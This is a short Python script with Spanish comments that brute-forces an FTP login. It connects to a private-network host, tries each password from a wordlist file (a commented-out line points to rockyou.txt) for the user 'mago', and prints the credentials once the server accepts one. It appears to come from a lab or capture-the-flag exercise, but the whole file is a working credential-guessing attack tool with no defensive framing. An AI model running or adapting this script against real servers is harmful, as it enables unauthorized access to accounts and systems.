#!/usr/bin/python3

import ftplib
import io

def verificar(usuario, contrasenia):
	output = str() # cadena vacia

	try:
		output = ftp.login(usuario, contrasenia)
	except:
		pass

	if "230" in output:
		return True
	else:
		return False

host = "192.168.86.39"

ftp = ftplib.FTP()

usuario = "mago"

ftp.connect(host, 21, -999)

#with open("/usr/share/wordlists/rockyou.txt", encoding = "ISO-8859-1") as f:
#	parrafos = [linea.split() for linea in f]

diccionario = open("diccionario.txt", mode = "r", encoding = "ISO-8859-1")

for password in diccionario.read().split('\n'):
	if verificar(usuario, password.strip()) == True:
		print("[+] Credenciales validas para:" + usuario + ":" + password)
		break

#for password in diccionario_fuerza_bruta.read().split('\n'):
#	print(password.strip())

#print(verificar(usuario, 'password1234'))

diccionario.close()

ftp.close()
